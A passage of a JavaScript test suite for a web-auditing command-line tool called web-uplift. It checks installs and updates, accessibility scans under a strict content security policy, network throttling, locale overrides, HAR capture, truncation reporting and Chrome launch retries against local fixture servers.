    assert(
      copied.version === entry.version,
      `recorded version for ${entry.name} must match the installed tree: manifest says ${entry.version}, on disk ${copied.version}`,
    );
  }

  const evidenceUsage = run(process.execPath, ['.web-uplift/evidence/cli.mjs'], {
    cwd: target,
  });
  assert(evidenceUsage.status === 1, 'evidence CLI without args should print usage and exit 1');
  assert(
    evidenceUsage.stderr.includes('Usage: node evidence/cli.mjs') &&
      !evidenceUsage.stderr.includes('ERR_MODULE_NOT_FOUND'),
    `installed evidence CLI did not load cleanly:\n${evidenceUsage.stderr}`,
  );

  // The scorecard must be vendored too (aggregate/ + the runner/ it imports), so
  // an installed project can generate the interactive scorecard. A clean load
  // prints its usage; a missing aggregate/ or runner/ would throw at import.
  const scorecardUsage = run(process.execPath, ['.web-uplift/aggregate/scorecard.mjs'], { cwd: target });
  assert(
    !scorecardUsage.stderr.includes('ERR_MODULE_NOT_FOUND') && scorecardUsage.stderr.includes('scorecard'),
    `installed scorecard did not load (aggregate/ or runner/ not vendored?):\n${scorecardUsage.stderr}`,
  );
}

function testUpdateDryRunReadsInstallManifest() {
  const target = join(tmp, 'update-target');
  mkdirSync(join(target, '.web-uplift'), { recursive: true });
  writeFileSync(join(target, '.web-uplift/manifest.json'), JSON.stringify({
    package: 'web-uplift',
    version: '0.0.1',
    installedAt: '2026-01-01T00:00:00.000Z',
    agents: ['codex'],
  }, null, 2) + '\n');

  const pkg = readJson('package.json');
  const result = run(process.execPath, [
    'bin/web-uplift.mjs',
    'update',
    '--agent',
    'codex',
    '--target',
    target,
    '--dry-run',
  ], { env: noUpdateEnv() });
  assert(result.status === 0, `update dry-run failed: ${result.stderr || result.stdout}`);
  assert(result.stdout.includes('Existing web-uplift install found: 0.0.1'), `update did not read old manifest:\n${result.stdout}`);
  assert(result.stdout.includes(`Updating to: ${pkg.version}`), `update did not print target version:\n${result.stdout}`);
  assert(result.stdout.includes('.web-uplift/manifest.json'), `update dry-run did not include manifest write:\n${result.stdout}`);
}

function testCachedUpdateWarning() {
  const cacheRoot = join(tmp, 'update-cache');
  mkdirSync(join(cacheRoot, 'web-uplift'), { recursive: true });
  writeFileSync(join(cacheRoot, 'web-uplift/update-check.json'), JSON.stringify({
    latest: '999.0.0',
    checkedAt: Date.now(),
  }, null, 2) + '\n');

  const result = run(process.execPath, [
    'bin/web-uplift.mjs',
    'install',
    '--agent',
    'codex',
    '--target',
    join(tmp, 'cached-update-target'),
    '--dry-run',
  ], {
    env: {
      ...process.env,
      XDG_CACHE_HOME: cacheRoot,
      CI: '',
      WEB_UPLIFT_NO_UPDATE_CHECK: '',
    },
  });
  assert(result.status === 0, `cached update warning command failed: ${result.stderr || result.stdout}`);
  assert(result.stderr.includes('web-uplift 999.0.0 is available'), `cached update warning was not printed:\n${result.stderr}`);
  assert(result.stderr.includes('npx -y web-uplift@latest update --agent all'), `cached update warning missed update command:\n${result.stderr}`);
}

async function testPreNavigationEmulation() {
  const html =
    '<!doctype html><script>' +
    "window.initialReduce = matchMedia('(prefers-reduced-motion: reduce)').matches;" +
    '</script>';
  const value = await gather(
    'evaluate',
    `data:text/html,${encodeURIComponent(html)}`,
    {
      quiet: true,
      wait: 0,
      emulateMedia: [{ name: 'prefers-reduced-motion', value: 'reduce' }],
      expr:
        "({ initial: window.initialReduce, current: matchMedia('(prefers-reduced-motion: reduce)').matches })",
    },
  );
  assert(value.initial === true, `emulated media was not visible during load: ${JSON.stringify(value)}`);
  assert(value.current === true, `emulated media was not visible after load: ${JSON.stringify(value)}`);
}

// The axe primitive must work where the audit was previously blind: a site
// with a strict script-src refuses CDN fetches and injected <script src>, so
// axe through the evaluate primitive silently returned nothing. The primitive
// reads the VENDORED axe-core from disk and enables Page.setBypassCSP scoped to
// itself. If either regresses this test finds no violations on a page that
// provably has them.
async function testAxePrimitiveBypassesStrictCsp() {
  const html =
    '<!doctype html><html><head><title>strict csp</title></head><body>' +
    '<h1>Title</h1><h3>Skipped level</h3>' +
    '<img src="data:image/gif;base64,R0lGODlhAQABAAAAACw=">' +
    '<button></button>' +
    '</body></html>';
  const server = http.createServer((req, res) => {
    res.writeHead(200, {
      'Content-Type': 'text/html',
      'Content-Security-Policy': "script-src 'self'; default-src 'self'",
    });
    res.end(html);
  });
  await new Promise((r) => server.listen(0, '127.0.0.1', r));
  try {
    const result = await gather('axe', `http://127.0.0.1:${server.address().port}/`, { quiet: true, wait: 200 });
    const all = Object.values(result.violations).flat();
    const ids = all.map((v) => v.id);
    assert(result.toolVersion, `axe: toolVersion missing (injection failed?): ${JSON.stringify(result)}`);
    assert(ids.includes('image-alt'), `axe: image-alt not found under strict CSP: ${ids.join(', ')}`);
    assert(ids.includes('heading-order'), `axe: heading-order not found under strict CSP: ${ids.join(', ')}`);
    assert(ids.includes('button-name'), `axe: button-name not found under strict CSP: ${ids.join(', ')}`);
    assert(result.violations.critical.some((v) => v.id === 'image-alt'),
      'axe: violations must be grouped by impact (image-alt is critical)');
    for (const v of all) {
      assert(v.nodeCount >= v.nodes.length, `axe: ${v.id} node cap must be announced, not silent`);
      assert(v.nodes.length > 0 && v.nodes[0].target, `axe: ${v.id} should carry node targets`);
    }
    assert(result.counts.passes > 0, 'axe: counts should include concluded passes');
  } finally {
    server.close();
  }
}

// CWV thresholds are calibrated against mid-tier mobile on variable networks;
// an unthrottled headless desktop is the one configuration guaranteed to pass.
// The throttling conditions must be (a) actually applied to the connection/CPU
// and (b) recorded in the output, so a finding states the device class it was
// measured on.
async function testThrottlingConditions() {
  const html = '<!doctype html><html><head><title>t</title></head><body><h1>x</h1></body></html>';
  const server = http.createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end(html);
  });
  await new Promise((r) => server.listen(0, '127.0.0.1', r));
  try {
    const base = `http://127.0.0.1:${server.address().port}/`;

    // The conditions a run was measured under are recorded in the output.
    const shaped = await gather('layout', base, {
      quiet: true,
      wait: 100,
      network: 'fast-3g',
      cpuThrottle: 4,
      viewport: { w: 360, h: 800 },
    });
    assert(shaped.conditions?.network?.profile === 'fast-3g',
      `throttle: layout output must record the network profile: ${JSON.stringify(shaped.conditions)}`);
    assert(shaped.conditions.network.downloadThroughputBps === 180000 &&
      shaped.conditions.network.uploadThroughputBps === 84375 &&
      shaped.conditions.network.latencyMs === 562.5,
      `throttle: fast-3g must carry the exact DevTools preset numbers: ${JSON.stringify(shaped.conditions.network)}`);
    assert(shaped.conditions.cpuThrottleRate === 4,
      `throttle: layout output must record the CPU rate: ${JSON.stringify(shaped.conditions)}`);
    assert(shaped.conditions.viewport?.width === 360,
      `throttle: layout output must record the viewport: ${JSON.stringify(shaped.conditions)}`);

    // mobile-lighthouse applies its 4x CPU slowdown without a separate flag.
    const mobile = await gather('layout', base, { quiet: true, wait: 100, network: 'mobile-lighthouse' });
    assert(mobile.conditions.cpuThrottleRate === 4 && mobile.conditions.network.latencyMs === 150,
      `throttle: mobile-lighthouse must imply 4x CPU + 150ms RTT: ${JSON.stringify(mobile.conditions)}`);

    // The shaping must be REAL, not just recorded: a slow-3g RTT of 2000ms
    // shows up in a fetch the page makes.
    const probe = { quiet: true, wait: 100, expr: '(async()=>{const t=performance.now(); await fetch("/p"); return performance.now()-t;})()' };
    const plain = await gather('evaluate', base, probe);
    const throttled = await gather('evaluate', base, { ...probe, network: 'slow-3g' });
    assert(throttled > plain + 1000,
      `throttle: slow-3g should add ~2000ms RTT, got plain=${Math.round(plain)}ms shaped=${Math.round(throttled)}ms`);

    // An unthrottled run carries no conditions block at all (not an empty one).
    const unthrottled = await gather('layout', base, { quiet: true, wait: 100 });
    assert(!('conditions' in unthrottled),
      `throttle: an unthrottled run must not claim conditions: ${JSON.stringify(unthrottled.conditions)}`);

    // Unknown profiles fail loudly, never silently fall back to unshaped.
    let rejected = false;
    try {
      await gather('layout', base, { quiet: true, wait: 100, network: 'dial-up' });
    } catch (err) {
      rejected = /Unknown network profile/.test(err.message);
    }
    assert(rejected, 'throttle: an unknown profile must be rejected by name');
  } finally {
    server.close();
  }
}

// The three be-internationalised checks are only observable by rendering under
// a second locale / time zone and diffing what the page actually shows -
// source reading cannot see a hard-coded calendar assumption or a naive Date
// through a formatter. The overrides must be REAL (rendered output differs)
// and RECORDED (each side of the diff states its conditions).
async function testLocaleTimezoneConditions() {
  const probe =
    '({ tz: Intl.DateTimeFormat().resolvedOptions().timeZone,' +
    ' rendered: new Date(Date.UTC(2026, 0, 15, 2, 0)).toLocaleString(),' +
    ' num: (12345.678).toLocaleString() })';
  const url = 'data:text/html,<h1>i18n</h1>';

  const tokyo = await gather('evaluate', url, { quiet: true, wait: 0, expr: probe, timezone: 'Asia/Tokyo' });
  const newYork = await gather('evaluate', url, { quiet: true, wait: 0, expr: probe, timezone: 'America/New_York' });
  assert(tokyo.tz === 'Asia/Tokyo' && newYork.tz === 'America/New_York',
    `i18n: the timezone override must apply: ${tokyo.tz} / ${newYork.tz}`);
  assert(tokyo.rendered !== newYork.rendered,
    `i18n: 02:00 UTC must render as different local times in Tokyo and New York: ${tokyo.rendered} / ${newYork.rendered}`);
  assert(tokyo.conditions?.timezone === 'Asia/Tokyo' && newYork.conditions?.timezone === 'America/New_York',
    `i18n: each side of the diff must record its timezone: ${JSON.stringify(tokyo.conditions)} / ${JSON.stringify(newYork.conditions)}`);

  const german = await gather('evaluate', url, { quiet: true, wait: 0, expr: probe, locale: 'de-DE' });
  assert(german.num === '12.345,678',
    `i18n: de-DE must render the comma decimal separator: ${german.num}`);
  assert(german.conditions?.locale === 'de-DE',
    `i18n: the locale must be recorded: ${JSON.stringify(german.conditions)}`);

  // The screenshot primitive records its conditions too (it bypasses emit()
  // because its artifact is binary).
  const shot = await gather('screenshot', url, { quiet: true, wait: 0, locale: 'fr-FR', out: join(tmp, 'i18n-shot.png') });
  assert(shot.conditions?.locale === 'fr-FR',
    `i18n: the screenshot must record its locale: ${JSON.stringify(shot)}`);

  // Invalid values fail loudly instead of silently judging the default locale.
  for (const [opts, pattern] of [
    [{ locale: '!!bogus!!' }, /Invalid --locale/],
    [{ timezone: 'Mars/Olympus_Mons' }, /Invalid --timezone/],
  ]) {
    let rejected = false;
    try {
      await gather('evaluate', url, { quiet: true, wait: 0, expr: '1', ...opts });
    } catch (err) {
      rejected = pattern.test(err.message);
    }
    assert(rejected, `i18n: ${JSON.stringify(opts)} must be rejected by name`);
  }
}

async function testHarRedirects() {
  // Also covers the --bodies path: the document plus 12 scripts is more than the
  // body-fetch pool's in-flight limit, so the pool has to recycle its workers,
  // and the redirect entry must still end up with no body attached.
  const BODY_COUNT = 12;
  const server = http.createServer((req, res) => {
    const path = (req.url || '').split('?')[0];
    if (path === '/start') {
      res.writeHead(302, { Location: '/final' });
      res.end('redirecting');
      return;
    }
    if (/^\/s\d+\.js$/.test(path)) {
      res.writeHead(200, { 'Content-Type': 'text/javascript' });
      res.end(`window.__body_${path.slice(2, -3)} = true;`);
      return;
    }
    res.writeHead(200, { 'Content-Type': 'text/html' });
    const scripts = Array.from({ length: BODY_COUNT }, (_, i) => `<script src="/s${i}.js"></script>`).join('');
    res.end(`<!doctype html><title>ok</title><link rel="icon" href="data:,">${scripts}ok`);
  });

  await new Promise((resolveListen) => server.listen(0, '127.0.0.1', resolveListen));
  try {
    const { port } = server.address();
    const out = join(tmp, 'network.har');
    const result = await gather('har', `http://127.0.0.1:${port}/start`, {
      quiet: true,
      // 2.5s, not the 250ms this test used before it asserted on bodies: the
      // subresource loadingFinished events that make a body retrievable can
      // arrive well after the load event on a heavily stolen-CPU box, so a
      // tight window makes --bodies assertions flap for environmental reasons.
      wait: 2500,
      bodies: true,
      out,
    });
    assert(result.statusBreakdown['302'] === 1, `HAR status breakdown missed redirect: ${JSON.stringify(result.statusBreakdown)}`);

    const summary = JSON.parse(readFileSync(join(tmp, 'network-summary.json'), 'utf8'));
    assert(
      summary.hygiene.redirects.some((r) => r.status === 302 && r.location === '/final'),
      `HAR summary missed redirect hygiene entry: ${JSON.stringify(summary.hygiene.redirects)}`,
    );

    // --bodies must attach every retrievable body, including past the pool's
    // concurrency limit, and must not attach one to the redirect entry.
    const har = JSON.parse(readFileSync(out, 'utf8'));
    const withBody = har.log.entries.filter((e) => e.response?.content?.text !== undefined);
    assert(
      withBody.length === BODY_COUNT + 1,
      `--bodies must capture ${BODY_COUNT + 1} bodies (document + ${BODY_COUNT} scripts), got ${withBody.length}`,
    );
    for (let i = 0; i < BODY_COUNT; i++) {
      const entry = har.log.entries.find((e) => e.request.url.endsWith(`/s${i}.js`));
      assert(
        entry?.response?.content?.text === `window.__body_${i} = true;`,
        `--bodies missed or corrupted /s${i}.js body: ${JSON.stringify(entry?.response?.content)}`,
      );
    }
    const redirectEntry = har.log.entries.find((e) => e.request.url.endsWith('/start'));
    assert(redirectEntry?.response?.content?.text == null, '--bodies must not attach a body to the redirect entry');
    const documentEntry = har.log.entries.find((e) => e.request.url.endsWith('/final'));
    assert(documentEntry?.response?.content?.text?.includes('ok'), '--bodies must capture the document body');
  } finally {
    await new Promise((resolveClose) => server.close(resolveClose));
  }
}

// web-uplift-1s8: a cap that drops evidence must say so, in the JSON and on
// stderr. The dom primitive's 200000-character CSS/HTML cap is the dangerous
// one: a model grepping the returned css for "@container" cannot otherwise tell
// "the site does not use container queries" from "the evidence was cut off".
async function testEvidenceTruncationReporting() {
  const filler = 'z'.repeat(1000);
  const bigCss = Array.from({ length: 300 }, (_, i) => `.pad${i}{--filler-${i}:"${filler}"}`).join('\n');
  const pixel = Uint8Array.from(atob('R0lGODlhAQABAIAAAAAAAP///ywAAAAAAQABAAACAUwAOw=='), (c) => c.charCodeAt(0));

  const server = http.createServer((req, res) => {
    const path = (req.url || '/').split('?')[0];
    if (path === '/pixel.gif') {
      res.writeHead(200, { 'Content-Type': 'image/gif' });
      res.end(pixel);
      return;
    }
    res.writeHead(200, { 'Content-Type': 'text/html' });
    if (path === '/over-cap') {
      res.end(`<!doctype html><title>over</title><style>${bigCss}</style><h1>over</h1>`);
      return;
    }
    if (path === '/under-cap') {
      res.end('<!doctype html><title>under</title><style>.a{color:#123}</style><h1>under</h1>');
      return;
    }
    if (path === '/many-images') {
      const imgs = Array.from({ length: 40 }, (_, i) => `<img src="/pixel.gif?i=${i}" alt="pixel ${i}" width="1" height="1">`).join('');
      res.end(`<!doctype html><title>images</title>${imgs}`);
      return;
    }
    if (path === '/many-cookies') {
      res.end("<!doctype html><title>cookies</title><script>for (let i = 0; i < 51; i++) document.cookie = 'cap' + i + '=1;path=/';</script>");
      return;
    }
    res.end('<!doctype html><title>empty</title>');
  });

  await new Promise((resolveListen) => server.listen(0, '127.0.0.1', resolveListen));
  try {
    const { port } = server.address();
    const base = `http://127.0.0.1:${port}`;

    // Over the cap, through the real CLI: the JSON reports what was cut, stderr
    // says it out loud, and the shown text is exactly the cap.
    const cli = await runAsync(process.execPath, ['evidence/cli.mjs', 'dom', `${base}/over-cap`, '--wait', '250']);
    assert(cli.status === 0, `truncation: dom CLI failed:\n${cli.stderr}\n${cli.stdout}`);
    const over = JSON.parse(cli.stdout);
    assert(
      over.page.cssTruncated === true && over.page.cssChars > 200000 && over.page.css.length === 200000,
      `truncation: the 200KB CSS cap was not reported: ${JSON.stringify({ cssChars: over.page.cssChars, shown: over.page.css.length, truncated: over.page.cssTruncated })}`,
    );
    assert(
      over.page.outerHTML.length === Math.min(over.page.outerHTMLChars, 200000),
      'truncation: outerHTML length does not match its reported total',
    );
    assert(
      /WARNING: dom\.css/.test(cli.stderr),
      `truncation: the CLI did not warn about the cut CSS:\n${cli.stderr}`,
    );

    // Under the cap the same fields have to prove completeness: not truncated,
    // and the shown text is the whole text.
    const under = await gather('dom', `${base}/under-cap`, { quiet: true, wait: 250 });
    assert(
      under.page.cssTruncated === false && under.page.cssChars === under.page.css.length && under.page.css.length > 0,
      `truncation: a complete CSS sample was not reported as complete: ${JSON.stringify({ cssChars: under.page.cssChars, shown: under.page.css.length, truncated: under.page.cssTruncated })}`,
    );

    // The list caps report the same way: 40 images on the page, 30 listed.
    const images = await gather('images', `${base}/many-images`, { quiet: true, wait: 250 });
    assert(images.totalImages === 40, `truncation: images total is wrong: ${images.totalImages}`);
    assert(
      images.imagesInspected === 40 && images.imagesInspectedTruncated === false,
      `truncation: images inspection cap misreported: ${JSON.stringify({ inspected: images.imagesInspected, truncated: images.imagesInspectedTruncated })}`,
    );
    assert(
      images.imagesTruncated === true && images.images.length === 30,
      `truncation: images listing cap misreported: ${JSON.stringify({ listed: images.images.length, truncated: images.imagesTruncated })}`,
    );

    // 51 cookies set, 50 listed.
    const cookies = await gather('cookies', `${base}/many-cookies`, { quiet: true, wait: 250 });
    assert(cookies.totalCookies === 51, `truncation: cookies total is wrong: ${cookies.totalCookies}`);
    assert(
      cookies.cookiesTruncated === true && cookies.cookies.length === 50,
      `truncation: cookies listing cap misreported: ${JSON.stringify({ listed: cookies.cookies.length, truncated: cookies.cookiesTruncated })}`,
    );
  } finally {
    await new Promise((resolveClose) => server.close(resolveClose));
  }
}

function testBatchDryRunUsesRetainedDirs() {
  const reports = join(tmp, 'reports');
  const result = run(process.execPath, [
    'runner/run-batch.mjs',
    '--dry-run',
    '--agent',
    'codex',
    '--out',
    reports,
    'https://example.com',
  ]);
  assert(result.status === 0, `batch dry-run failed: ${result.stderr || result.stdout}`);
  assert(
    result.stdout.includes(`${reports}/example_com/<timestamp>`),
    `batch dry-run did not use retained run dir:\n${result.stdout}`,
  );
  assert(!result.stdout.includes(`${reports}/codex/`), `batch dry-run still used old agent prefix:\n${result.stdout}`);
}

function testBatchFlowDryRun() {
  const reports = join(tmp, 'reports-flow');
  const flowPath = join(tmp, 'flow.json');
  writeFileSync(flowPath, JSON.stringify({
    title: 'Signup',
    steps: [{ type: 'navigate', url: 'https://example.com/' }, { type: 'click', selectors: [['#go']] }],
  }));
  const result = run(process.execPath, [
    'runner/run-batch.mjs', '--dry-run', '--agent', 'claude', '--out', reports, '--flow', flowPath, 'https://example.com',
  ]);
  assert(result.status === 0, `batch --flow dry-run failed: ${result.stderr || result.stdout}`);
  assert(result.stdout.includes('would replay') && result.stdout.includes('Signup'), `batch --flow dry-run did not announce the replay:\n${result.stdout}`);
  assert(result.stdout.includes('already replayed for you'.toLowerCase()) || result.stdout.includes('ALREADY replayed'), `batch --flow dry-run did not pass flow guidance to the agent:\n${result.stdout}`);
}

function packTarball() {
  const packDir = join(tmp, 'pack');
  mkdirSync(packDir, { recursive: true });
  const result = run('npm', ['pack', '--quiet', '--pack-destination', packDir]);
  assert(result.status === 0, `npm pack failed:\n${result.stderr || result.stdout}`);
  const file = result.stdout.trim().split('\n').filter(Boolean).pop();
  assert(file, `npm pack did not print a tarball name:\n${result.stdout}`);
  return join(packDir, file);
}

function readJson(path) {
  return JSON.parse(readFileSync(join(repoRoot, path), 'utf8'));
}

function noUpdateEnv() {
  return { ...process.env, WEB_UPLIFT_NO_UPDATE_CHECK: '1' };
}

function validateJson(ajv, schema, path) {
  const validate = ajv.compile(schema);
  const data = readJson(path);
  if (!validate(data)) {
    throw new Error(`${path} failed schema validation:\n${ajv.errorsText(validate.errors, { separator: '\n' })}`);
  }
}

function listFiles(dir, predicate, out = []) {
  for (const name of readdirSync(dir)) {
    if (SKIP_DIRS.has(name)) continue;
    const full = join(dir, name);
    const st = statSync(full);
    if (st.isDirectory()) listFiles(full, predicate, out);
    else if (predicate(full)) out.push(full);
  }
  return out;
}

// resolveChromePath must find a Chrome for Testing / Puppeteer cache binary when
// CHROME_BIN is not set. The fleet VMs have no distro Chrome, so before this an
// npm test run there failed only after it had already queued for the single
// heavy slot. No browser is launched: the candidates are plain files in a fake
// HOME, which also pins the override precedence (CHROME_BIN > CHROME_PATH >
// cache > distro).
function testChromeCandidateDiscovery() {
  const home = mkdtempSync(join(tmpdir(), 'web-uplift-chrome-cache-'));
  const cftNew = join(home, '.cache', 'chrome', 'linux-1000.0.0.0', 'chrome-linux64', 'chrome');
  const cftOld = join(home, '.cache', 'chrome', 'linux-999.0.8037.99', 'chrome-linux64', 'chrome');
  const puppeteer = join(home, '.cache', 'puppeteer', 'chrome', 'linux-888.0.0.0', 'chrome-linux64', 'chrome');
  const alias = join(home, 'chrome-path-alias');
  const binOverride = join(home, 'chrome-bin-override');
  for (const file of [cftNew, cftOld, puppeteer, alias, binOverride]) {
    mkdirSync(dirname(file), { recursive: true });
    writeFileSync(file, '#!/bin/sh\nexit 0\n', { mode: 0o755 });
  }

  const saved = new Map(['HOME', 'CHROME_BIN', 'CHROME_PATH'].map((name) => [name, process.env[name]]));
  try {
    process.env.HOME = home;
    delete process.env.CHROME_BIN;
    delete process.env.CHROME_PATH;

    assert(
      resolveChromePath() === cftNew,
      `CHROME_BIN unset: the newest cache version must win (numeric sort, not lexicographic), got ${resolveChromePath()}`,
    );
    // A cache path that exists but is not an executable file (a partial extract
    // or directory husk) must be skipped, not returned and left to fail at spawn.
    chmodSync(cftNew, 0o644);
    assert(
      resolveChromePath() === cftOld,
      `a non-executable cache entry must be skipped in favour of the next candidate, got ${resolveChromePath()}`,
    );
    chmodSync(cftNew, 0o755);
    assert(resolveChromePath() === cftNew, `an executable cache entry must be used, got ${resolveChromePath()}`);
    rmSync(cftNew);
    rmSync(cftOld);
    assert(
      resolveChromePath() === puppeteer,
      `CHROME_BIN unset: must fall back to the Puppeteer cache layout, got ${resolveChromePath()}`,
    );
    process.env.CHROME_PATH = alias;
    assert(
      resolveChromePath() === alias,
      `CHROME_PATH must be honoured as a CHROME_BIN alias, got ${resolveChromePath()}`,
    );
    process.env.CHROME_BIN = binOverride;
    assert(
      resolveChromePath() === binOverride,
      `CHROME_BIN must win over CHROME_PATH, got ${resolveChromePath()}`,
    );
  } finally {
    for (const [name, value] of saved) {
      if (value === undefined) delete process.env[name];
      else process.env[name] = value;
    }
    rmSync(home, { recursive: true, force: true });
  }
}

// The launch layer must retry the WHOLE attempt (a fresh profile dir each time)
// and must say WHY it failed, because "still alive but silent" (a wedge) and
// "exited early" (a crash) are different faults with different fixes, and a
// bare "timed out" collapses them into one symptom. A fake CHROME_BIN that exits
// immediately, and one that fails once and then prints the DevTools line,
// exercise the retry, the diagnostics, the recovery and the profile-dir cleanup
// with no real browser, so this stays cheap and deterministic.
async function testLaunchRetryAndDiagnostics() {
  const savedBin = process.env.CHROME_BIN;
  const dir = mkdtempSync(join(tmpdir(), 'web-uplift-launch-retry-'));
  try {
    // Every attempt exits immediately: retry, then a diagnostic failure.
    const marker = join(dir, 'attempts');
    const failing = join(dir, 'failing-chrome');
    writeFileSync(failing, `#!/bin/sh\necho attempt >> "${marker}"\nexit 7\n`, { mode: 0o755 });
    const profiles = [];
    process.env.CHROME_BIN = failing;
    let error = null;
    try {
      await launchChrome({
        log: (line) => {
          const match = /profile (\S+)\)/.exec(line);
          if (match) profiles.push(match[1]);
        },
      });
    } catch (err) {
      error = err;
    }
    assert(error instanceof Error, 'launchChrome must reject when every attempt fails');
    assert(/exited early/.test(error.message), `launch failure must name the early exit: ${error.message}`);
    assert(/code 7/.test(error.message), `launch failure must report the exit code: ${error.message}`);
    assert(/freshProfile=true/.test(error.message), `launch failure must report a fresh profile: ${error.message}`);
    assert(/alive=false/.test(error.message), `launch failure must report liveness: ${error.message}`);
    assert(/stderr=/.test(error.message), `launch failure must report stderr: ${error.message}`);
    if (existsSync('/proc/loadavg')) {
      assert(/load=/.test(error.message), `launch failure must report host load: ${error.message}`);
    }
    const spawns = existsSync(marker) ? readFileSync(marker, 'utf8').trim().split('\n').filter(Boolean).length : 0;
    assert(profiles.length > 1, `launchChrome must retry the whole launch, saw ${profiles.length} attempt(s)`);
    assert(spawns === profiles.length, `each retry must spawn once, marker=${spawns} profiles=${profiles.length}`);
    assert(new Set(profiles).size === profiles.length, 'each retry must use a fresh profile dir');
    for (const profile of profiles) {
      assert(!existsSync(profile), `a failed launch must clean up its profile dir: ${profile}`);
    }

    // A wedge (browser still alive but never printing the DevTools line) must be
    // reported as ALIVE, not as the SIGTERM-killed process that teardown leaves
    // behind. The short timeout keeps this cheap, and this is the assertion that
    // fails if liveness is read after close() instead of before it.
    const wedging = join(dir, 'wedging-chrome');
    writeFileSync(wedging, '#!/bin/sh\nsleep 30\n', { mode: 0o755 });
    const wedgeProfiles = [];
    process.env.CHROME_BIN = wedging;
    let wedgeError = null;
    try {
      await launchChrome({
        devtoolsTimeoutMs: 400,
        log: (line) => {
          const match = /profile (\S+)\)/.exec(line);
          if (match) wedgeProfiles.push(match[1]);
        },
      });
    } catch (err) {
      wedgeError = err;
    }
    assert(wedgeError instanceof Error, 'a wedged chrome must fail the launch');
    assert(/alive=true/.test(wedgeError.message), `a wedge must be reported as alive-but-silent: ${wedgeError.message}`);
    assert(/signal=null/.test(wedgeError.message), `a wedge must not be reported as signal-killed: ${wedgeError.message}`);
    assert(/stderr=/.test(wedgeError.message), `a wedge must report stderr: ${wedgeError.message}`);
    assert(wedgeProfiles.length > 1, `a wedged launch must still retry, saw ${wedgeProfiles.length}`);
    for (const profile of wedgeProfiles) {
      assert(!existsSync(profile), `a wedged launch must clean up its profile dir: ${profile}`);
    }

    // A transient failure followed by a good launch must recover on retry.
    const counter = join(dir, 'count');
    const flaky = join(dir, 'flaky-chrome');
    writeFileSync(
      flaky,
      `#!/bin/sh\nn=$(cat "${counter}" 2>/dev/null || echo 0)\nn=$((n + 1))\necho $n > "${counter}"\n` +
        `if [ "$n" -ge 2 ]; then echo "DevTools listening on ws://127.0.0.1:9222/" 1>&2; sleep 30; fi\nexit 5\n`,
      { mode: 0o755 },
    );
    process.env.CHROME_BIN = flaky;
    const handle = await launchChrome({ log: () => {} });
    assert(handle.port === 9222, `a recovered launch must parse the DevTools port, got ${handle.port}`);
    assert(readFileSync(counter, 'utf8').trim() === '2', 'the flaky launch must recover on its second attempt');
    await handle.close();
    assert(!existsSync(handle.userDataDir), `close must remove the profile dir: ${handle.userDataDir}`);
  } finally {
    if (savedBin === undefined) delete process.env.CHROME_BIN;
    else process.env.CHROME_BIN = savedBin;
    rmSync(dir, { recursive: true, force: true });
  }
}

// har records the network while a page loads, but a response can land after the
// fixed observation window: a fetch/XHR the page fires post-load, or a CDP event
// still queued under host CPU starvation. The primitive must settle the network
// before snapshotting rather than trusting the sleep, and it must say how long
// the load waiter took (web-uplift-e13). The server here deliberately holds the
// response past the window, so a primitive that trusts the sleep reports
// response.status 200 with no body and a non-zero pending count.
async function testHarWaitsForPendingResponses() {
  const server = http.createServer((req, res) => {
    const path = (req.url || '').split('?')[0];
    if (path === '/slow.json') {
      setTimeout(() => {
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end('{"slow":true}');
      }, 1500);
      return;
    }
    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end(
      '<!doctype html><title>slow-fixture</title><link rel="icon" href="data:,">' +
        '<script>fetch("/slow.json");</script><h1>slow</h1>',
    );
  });
  await new Promise((resolveListen) => server.listen(0, '127.0.0.1', resolveListen));
  try {
    const { port } = server.address();
    const out = join(tmp, 'slow-network.har');
    const result = await gather('har', `http://127.0.0.1:${port}/`, { quiet: true, wait: 400, bodies: true, out });
    assert(Number.isFinite(result.loadWaitMs), `har must report how long the load waiter took: ${result.loadWaitMs}`);
    assert(
      result.networkPendingAtSnapshot === 0,
      `har must settle the network before snapshotting; ${result.networkPendingAtSnapshot} still pending`,
    );
    const har = JSON.parse(readFileSync(out, 'utf8'));
    const slow = har.log.entries.find((e) => e.request.url.endsWith('/slow.json'));
    assert(
      slow?.response?.content?.text === '{"slow":true}',
      `har must capture a body that arrives after the observation window: ${JSON.stringify(slow?.response?.content)}`,
    );
  } finally {
    await new Promise((resolveClose) => server.close(resolveClose));
  }
}

// The trackers primitive records HOSTNAMES, so a third party whose hostname
// merely ENDS WITH the first-party hostname ('notlocalhost' for a page on
// 'localhost') must still be counted, while a SUBDOMAIN of the first party
// ('sub.localhost') must not be. The old bare `!endsWith(firstParty)` suffix
// match classified the first case as first-party and dropped it, and with it any
// known tracker on such a host.
async function testTrackersThirdPartySuffix() {
  const server = http.createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end(
      '<!doctype html><title>trackers-fixture</title><link rel="icon" href="data:,">' +
        '<img src="http://notlocalhost:9/tracker.js" alt="">' +
        '<img src="http://sub.localhost:9/sub.js" alt=""><h1>trackers fixture</h1>',
    );
  });
  await new Promise((resolveListen) => server.listen(0, '127.0.0.1', resolveListen));
  try {
    const { port } = server.address();
    const result = await gather('trackers', `http://localhost:${port}/`, { quiet: true, wait: 1500 });
    const third = (result.topThirdPartyByRequests || []).map((e) => e.origin);
    assert(
      result.firstParty === 'localhost',
      `trackers must record the page hostname as firstParty, got ${result.firstParty}`,
    );
    assert(
      third.includes('notlocalhost'),
      `a third party whose host only ends with the first-party host must still be counted: ${JSON.stringify(third)}`,
    );
    assert(
      !third.includes('localhost'),
      `the first-party host itself must not be counted as third-party: ${JSON.stringify(third)}`,
    );
    // Without this the test still passes with the subdomain clause deleted from
    // isFirstPartyHost (a mutant reduced to `host === firstParty` classifies
    // sub.localhost as third-party).
    assert(
      !third.includes('sub.localhost'),
      `a SUBDOMAIN of the first-party host must count as first-party: ${JSON.stringify(third)}`,
    );
  } finally {
    await new Promise((resolveClose) => server.close(resolveClose));
  }
}

// The interact deadline must be validated in the LOOP, not only in the CLI
// parser: a caller that passes opts.interactDeadlineMs directly to gather()
// bypasses parseArgs, and a non-finite or non-positive value would make
// `elapsed >= NaN` false forever with sleep(NaN) spinning at 0ms. No browser is
// needed here: the helper only reads collector.entries.
// The interact deadline must be bounded by the LOOP, not only by the CLI parser:
// gather() calls never go through parseArgs, and NaN/Infinity are not nullish, so
